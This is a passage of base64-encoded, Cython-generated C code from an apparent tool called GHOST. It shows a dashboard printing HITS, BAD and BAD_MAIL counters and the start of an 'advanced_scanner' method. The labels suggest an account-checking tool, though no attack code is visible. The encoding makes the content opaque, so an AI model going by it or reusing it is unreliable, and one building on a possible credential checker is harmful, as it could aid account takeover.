dF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQxNywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JFU0VUKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDE3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDE3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICBfX3B5eF90XzhbMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMTtcbiAgX19weXhfdF84WzFdID0gX19weXhfdF80O1xuICBfX3B5eF90XzhbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0hJVFM7XG4gIF9fcHl4X3RfOFszXSA9IF9fcHl4X3RfNTtcbiAgX19weXhfdF84WzRdID0gX19weXhfdF82O1xuICBfX3B5eF90XzhbNV0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMjtcbiAgX19weXhfdF83ID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF84LCA2LCA3ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF80KSArIDExICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF81KSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNikgKyA4LCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF80KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzUpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNikpO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MTcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgX19weXhfdF8zID0gMTtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIF9fcHl4X3RfN307XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KilfX3B5eF9idWlsdGluX3ByaW50LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoX19weXhfdF8zKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0MTYsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuXG4gIFxuICBfX3B5eF90XzcgPSBOVUxMO1xuXG4gIFxuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0MTksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SRUQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MTksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0MTksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0X2NvdW50ZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MTksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIxXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQxOSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQxOSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9DKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDE5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVTRVQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MTksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MTksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIF9fcHl4X3RfOFswXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzExO1xuICBfX3B5eF90XzhbMV0gPSBfX3B5eF90XzI7XG4gIF9fcHl4X3RfOFsyXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfQkFEO1xuICBfX3B5eF90XzhbM10gPSBfX3B5eF90XzY7XG4gIF9fcHl4X3RfOFs0XSA9IF9fcHl4X3RfNTtcbiAgX19weXhfdF84WzVdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTI7XG4gIF9fcHl4X3RfNCA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfOCwgNiwgNyArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMikgKyAxMSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNikgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzUpICsgOCwgMTI3IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF82KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzUpKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDE5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fcHl4X3RfMyA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF83LCBfX3B5eF90XzR9O1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfYnVpbHRpbl9wcmludCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMi1fX3B5eF90XzMpIHwgKF9fcHl4X3RfMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDE4LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcblxuICBcbiAgX19weXhfdF80ID0gTlVMTDtcblxuICBcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9DKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfWUVMTE9XKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldF9jb3VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MjEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MjEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JFU0VUKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX3B5eF90XzhbMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMTtcbiAgX19weXhfdF84WzFdID0gX19weXhfdF83O1xuICBfX3B5eF90XzhbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0JBRF9NQUlMO1xuICBfX3B5eF90XzhbM10gPSBfX3B5eF90XzU7XG4gIF9fcHl4X3RfOFs0XSA9IF9fcHl4X3RfNjtcbiAgX19weXhfdF84WzVdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTI7XG4gIF9fcHl4X3RfMiA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfOCwgNiwgNyArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNykgKyAxMSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNSkgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzYpICsgOCwgMTI3IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNykgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF81KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzYpKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gIF9fcHl4X3RfMyA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBfX3B5eF90XzJ9O1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfYnVpbHRpbl9wcmludCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMi1fX3B5eF90XzMpIHwgKF9fcHl4X3RfMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDIwLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcblxuICBcbiAgX19weXhfdF8yID0gTlVMTDtcbiAgX19weXhfdF8zID0gMTtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzEzfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X2J1aWx0aW5fcHJpbnQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8IChfX3B5eF90XzMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQyMiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG5cbiAgXG5cbiAgXG4gIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gIGdvdG8gX19weXhfTDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5jcmVhdGVfZGFzaGJvYXJkIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF8yOWFkdmFuY2VkX3NjYW5uZXIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMnR0XzVHSE9TVF8yOWFkdmFuY2VkX3NjYW5uZXIgPSB7ImFkdmFuY2VkX3NjYW5uZXIiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJ0dF81R0hPU1RfMjlhZHZhbmNlZF9zY2FubmVyLCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9O1xuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ydHRfNUdIT1NUXzI5YWR2YW5jZWRfc2Nhbm5lcihQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYgPSAwO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJncztcbiAgI2VuZGlmXG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlcztcbiAgUHlPYmplY3QqIHZhbHVlc1sxXSA9IHswfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJhZHZhbmNlZF9zY2FubmVyICh3cmFwcGVyKSIsIDApO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7XG4gICNlbHNlXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICNlbmRpZlxuICAjZW5kaWZcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7XG4gIHtcbiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZWxmLDB9O1xuICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwO1xuICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgNDI0LCBfX3B5eF9MM19lcnJvcilcbiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7XG4gICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7XG4gICAgICAgIGNhc2UgIDE6XG4gICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgNDI0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICBjYXNlICAwOiBicmVhaztcbiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICAgIH1cbiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7XG4gICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAiYWR2YW5jZWRfc2Nhbm5lciIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgNDI0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAxOyBpKyspIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJhZHZhbmNlZF9zY2FubmVyIiwgMSwgMSwgMSwgaSk7IF9fUFlYX0VSUigwLCA0MjQsIF9fcHl4X0wzX2Vycm9yKSB9XG4gICAgICB9XG4gICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAxKSkge1xuICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICB9IGVsc2Uge1xuICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgNDI0LCBfX3B5eF9MM19lcnJvcilcbiAgICB9XG4gICAgX19weXhfdl